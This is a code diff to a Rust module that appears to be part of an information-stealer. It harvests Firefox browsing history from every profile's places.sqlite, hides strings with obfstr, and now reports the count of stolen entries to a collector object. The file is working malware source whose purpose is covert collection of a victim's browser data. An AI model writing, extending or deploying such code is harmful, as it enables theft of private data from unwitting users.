@@ -1,11 +1,12 @@
 use crate::alloc::borrow::ToOwned;
-use alloc::sync::Arc;
-use tasks::{parent_name, Task};
-use utils::path::Path;
 use crate::gecko::GeckoBrowserData;
 use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, History};
-use obfstr::obfstr as s;
+use alloc::sync::Arc;
+use collector::{Browser, Collector};
 use database::TableRecord;
+use obfstr::obfstr as s;
+use tasks::{parent_name, Task};
+use utils::path::Path;
 
 const MOZ_PLACES_URL: usize = 1;
 const MOZ_PLACES_TITLE: usize = 2;
@@ -21,10 +22,10 @@ impl<'a> HistoryTask<'a> {
     }
 }
 
-impl Task for HistoryTask<'_> {
+impl<C: Collector> Task<C> for HistoryTask<'_> {
     parent_name!("History");
     
-    unsafe fn run(&self, parent: &Path) {
+    unsafe fn run(&self, parent: &Path, collector: &C) {
         let Some(mut history) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
             |profile| profile / s!("places.sqlite"),
@@ -37,6 +38,7 @@ impl Task for HistoryTask<'_> {
         history.sort_by(|a, b| b.last_visit_time.cmp(&a.last_visit_time));
         history.truncate(5000);
         
+        collector.get_browser().increase_history_by(history.len());
         let _ = to_string_and_write_all(&history, "\n\n", parent);
     }
 }
